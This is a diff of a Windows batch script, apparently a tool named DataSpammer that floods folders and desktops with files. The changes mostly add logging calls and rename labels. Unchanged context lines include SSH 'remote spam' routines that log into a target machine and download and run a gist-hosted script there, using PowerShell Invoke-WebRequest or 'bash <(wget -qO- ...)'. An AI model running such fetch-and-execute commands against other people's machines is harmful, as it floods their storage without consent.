@@ -397,6 +397,7 @@
     goto menu
 
 :check.lib.git.update
+    if %logging% == 1 ( call :log Checking_For_Updates_from_Menu )
     goto :normal.start
 
 :help
@@ -467,6 +468,7 @@
     goto credits
 
 :settings
+    if %logging% == 1 ( call :log Opened_Settings_%dev-mode%_dev_mode)
     color
     if %dev-mode% == 1 set "settings-dev-display=Activated"
     if %dev-mode% == 0 set "settings-dev-display=Not Activated"
@@ -547,13 +549,14 @@
     If %menu4% == 9 goto menu
     goto settings
 
-:start.with.arguments
+:start.with.argument
     call :help.startup
     set /P "argument=Enter an Argument:"
     cd /d %~dp0
     install.bat -reverse.arg %argument%
 
 :experimental.features
+    if %logging% == 1 ( call :log Opened_Experimental_Features )
     echo [1] Fancy CLI (currently just cmd.exe in Linux Style)
     echo [2] API (In Developement)
     echo [3] New Spams (Coming Soon)
@@ -594,6 +597,7 @@
     goto settings.version.control
 
 :dev.force.update
+    if %logging% == 1 ( call :log Forcing_Update )
     echo Running Update Script...
     @ping -n 1 localhost> nul
     goto git.update.version
@@ -601,6 +605,7 @@
 
 
 :dev.switch.branch
+    if %logging% == 1 ( call :log Switching_to_Dev_Branch )
     cd /d %~dp0
     echo @echo off > updater.bat
     echo cd /d %~dp0 >> updater.bat
@@ -617,6 +622,7 @@
     exit /b
 
 :stable.switch.branch
+    if %logging% == 1 ( call :log Switching_to_stable_branch )
     cd /d %~dp0
     echo @echo off > updater.bat
     echo cd /d %~dp0 >> updater.bat
@@ -633,7 +639,7 @@
     exit
 
 
-:activate.dev.options
+:activate.dev.options   
     if %dev-mode% == 1 goto open.dev.settings
     echo Do you want to activate the Developer Options?
     echo Developer Options include Debugging, Logging and some extra Menus
@@ -644,10 +650,12 @@
         if %_erl%==N goto settings
     
 :open.dev.settings
-cd /d %~dp0 
-.\install.bat -dev.secret
-
+    if %logging% == 1 ( call :log opening_dev_settings )
+    cd /d %~dp0 
+    .\install.bat -dev.secret
+    
 :write-dev-options
+    if %logging% == 1 ( call :log Activating_Dev_Options )
     cd /d %~dp0
     echo Only delete this File if you want to deactivate Developer Options. > dev.conf
     echo Developer Options have been activated!
@@ -673,12 +681,14 @@ cd /d %~dp0
         )
     )) > !tmpfile!
     move /y !tmpfile! !file!
+    if %logging% == 1 ( call :log Changing_Standart_FileName )
     echo The Standart Filename was saved!
     cls
     goto settings
 
 
 :settings.default.directory.crash
+    if %logging% == 1 ( call :log Chaning_Standart_Directory )
     :: Standart Spam Directory Check
     cls 
     echo.
@@ -715,6 +725,7 @@ cd /d %~dp0
     goto settings.default.directory.crash
 
 :settings.logging
+    if %logging% == 1 ( call :log Opened_Logging_Settings )
     color 02
     cls
     if %logging% == 1 (
@@ -749,6 +760,7 @@ cd /d %~dp0
     goto settings.logging
 
 :enable.logging
+    if %logging% == 1 ( goto settings.logging )
     cd /d %~dp0
     set "file=settings.conf"
     set "linenr=5"
@@ -782,6 +794,8 @@ cd /d %~dp0
 
 
 :disable.logging
+    if %logging% == 0 ( goto settings.logging )
+    if %logging% == 1 ( call :log Disabling_Logging )
     cd /d %~dp0
     set "file=settings.conf"
     set "linenr=5"
@@ -999,8 +1013,11 @@ cd /d %~dp0
 
 
 :start
+    if %logging% == 1 ( call :log Opened_Start )
     call :sys.verify.execution
+    if %logging% == 1 ( call :log Start_Verified )
     cls
+:start.verified
     echo Choose the Method you want to use:
     @ping -n 1 localhost> nul
     echo.
@@ -1028,9 +1045,10 @@ cd /d %~dp0
     If %spammethod% == 2 goto desktop.icon.spam
     If %spammethod% == 3 goto ssh.spam
     If %spammethod% == 4 goto menu
-    goto start187
+    goto start.verified
 
 :ssh.spam
+    if %logging% == 1 ( call :log Opened_SSH_Spam )
     :: Not working - TLI For ssh.spam
     echo In Order to work the Remote Spam Method needs 4 Things.
     @ping -n 1 localhost> nul
@@ -1050,9 +1068,10 @@ cd /d %~dp0
     echo.
     set /P remotespamchoose=Choose an Option from above:
     if %remotespamchoose% == 1 goto ssh.spam.info
-    if %remotespamchoose% == 2 goto start187
+    if %remotespamchoose% == 2 goto start.verified
 
 :ssh.spam.info
+    if %logging% == 1 ( call :log Listing_Local_IPs )
     :: Ask the User to enter the IP - supported with arp
     echo Please specify the IP of the Device
     @ping -n 1 localhost> nul
@@ -1114,18 +1133,21 @@ cd /d %~dp0
     if %linux-win-ssh% == 2 goto spam.ssh.target.lx
 
 :spam.ssh.target.win
+    if %logging% == 1 ( call :log Spamming_Windows_SSH_Target )
     set ssh_command="Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.bat' -OutFile 'spam.bat'; Start-Process 'spam.bat' -ArgumentList %ssh-filecount%"
     ssh %ssh-name%@%ssh-ip% "powershell -Command %ssh_command%"
     echo Successfully executed SSH Connection.
     goto ssh.done
 
 :spam.ssh.target.lx
+    if %logging% == 1 ( call :log Spamming_Linux_SSH_Target )
     set ssh_command="bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %filecount%"
     ssh %ssh-name%@%ssh-ip% "%ssh_command%"
     echo Successfully executed SSH Connection.
     goto ssh.done
 
 :ssh.done
+    if %logging% == 1 ( call :log Finished_SSH_Spam_Files:_%ssh-filecount%_Host_%ssh-name% )
     :: Remote Spam Done TLI
     echo.
     %$Echo% "   ____        _        ____                                            _           ____ ___ ____      _    _   ___   __
@@ -1139,7 +1161,7 @@ cd /d %~dp0
     @ping -n 1 localhost> nul
     echo.
     @ping -n 1 localhost> nul
-    echo The Script Created %ssh-filecount% Files on the PC of %ssh-name%
+    echo The Script Created %ssh-filecount% Files on the Machine of %ssh-name%
     echo.
     @ping -n 1 localhost> nul
     echo.
@@ -1162,6 +1184,7 @@ cd /d %~dp0
     goto ssh.done
 
 :desktop.icon.spam
+    if %logging% == 1 ( call :log Opened_Desktop_Spam )
     :: Desktop Spam Start TLI
     @ping -n 1 localhost> nul
     echo This Method will Spam your Desktop with Files
@@ -1268,6 +1291,7 @@ cd /d %~dp0
     exit
 
 :limited.desktop.spam
+    if %logging% == 1 ( call :log Spamming_Desktop_Count:_%deskiconspamamount% )
     :: Limited Spam Function
     color 02
     set "deskspamlimitedvar=1"
@@ -1280,6 +1304,7 @@ cd /d %~dp0
     goto limited.desktop.spam.1
 
 :normal.text.spam
+    if %logging% == 1 ( call :log Opened_Normal_Spam )
     :: dont know if that function is even used but it works
     if stdrc1 equ notused (goto sys.no.var.set) else (cd /d %stdrc1% && goto sys.check.custom.name)
 
@@ -1402,6 +1427,7 @@ cd /d %~dp0
 
 
 :done
+    if %logging% == 1 ( call :log Finished_Spamming_Files:_%filecount% )
     :: done tli
     cls
     echo.
@@ -1440,6 +1466,7 @@ cd /d %~dp0
     goto done
 
 :done2
+    if %logging% == 1 ( call :log Finished_Spamming_Files:_%deskspamlimitedvar% )
     :: done tli
     echo.
     %$Echo% "   ____        _        ____                                            _           ____ ___ ____      _    _   ___   __
@@ -1533,12 +1560,14 @@ cd /d %~dp0
     exit /b 0
 
 :custom.go
+   if %logging% == 1 ( call :log Opened_Custom_GOTO ) 
    if "%1"=="go" goto custom.go
    set "custom.goto.location=%2"
    goto %custom.goto.location%
 
 
 :sys.delete.script
+    if %logging% == 1 ( call :log Opened_Delete_Script )
     :: Delete Script TLI
     echo. 
     @ping -n 1 localhost> nul
@@ -1576,6 +1605,7 @@ cd /d %~dp0
     if %errorLevel% == 0 (goto sys.delete.script.confirmed) else (goto sys.script.administrator)
    
 :sys.delete.script.confirmed
+    if %logging% == 1 ( call :log Deleting_Script )
     :: Delete Script 
     if exist "%~dp0\LICENSE" del "%~dp0\LICENSE"
     echo 1/7 Files Deleted
@@ -1612,11 +1642,13 @@ cd /d %~dp0
     exit 0
 
 :restart.script
+    if %logging% == 1 ( call :log Restarting_Script )
     cd %~dp0
     dataspammer.bat
     exit restarted.script
 
 :sys.cli
+    if %logging% == 1 ( call :log Opened_CLI )
     @echo off
     for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
     echo Type 'help' to get an overview of commands
@@ -1634,7 +1666,7 @@ cd /d %~dp0
 
 :log
     :: call scheme is:
-    :: if %logging% == 1 ( set "log.msg=Starting DataSpammer" && call :log %log.msg% )
+    :: if %logging% == 1 ( call :log Opened_verify_tab )
 
     set "log.content=%1"
     set "logfile=DataSpammer.log"
@@ -1645,7 +1677,11 @@ cd /d %~dp0
         mkdir "%folder%"
     )
     
-    echo %date% %time% %log.content% >> "%folder%\%logfile%"
+    set "log.content.clean=%log.content%"
+    set log.content.clean=%log.content.clean:_= %
+    set log.content.clean=%log.content.clean:-= %
+
+    echo %date% %time% %log.content.clean% >> "%folder%\%logfile%"
     :: exit
     exit /b 0
     
@@ -1665,6 +1701,7 @@ cd /d %~dp0
 
 
 :sys.verify.execution
+    if %logging% == 1 ( call :log Opened_verify_tab )
     set "verify=%random%"
     powershell -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('Please enter Code %verify% to confirm that you want to execute this Option', 'DataSpammer Verify')}" > %TEMP%\out.tmp
     set /p OUT=<%TEMP%\out.tmp
